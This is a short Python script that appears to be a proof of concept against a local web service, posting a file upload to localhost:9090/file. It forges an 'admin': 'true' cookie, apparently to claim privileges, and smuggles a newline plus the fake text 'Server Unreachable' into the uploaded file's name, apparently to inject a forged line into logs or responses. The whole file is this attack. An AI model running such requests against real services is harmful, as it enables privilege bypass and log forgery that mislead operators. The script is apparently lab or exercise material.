import requests

url = "http://localhost:9090/file"
cookies = {
    'token': 'your_token_here',
    'admin': 'true'
}

# Filename with actual newline
files = {
    'file': ('normal.jpg\nServer Unreachable', b'content of file')
}

response = requests.post(url, cookies=cookies, files=files)
print(response.text)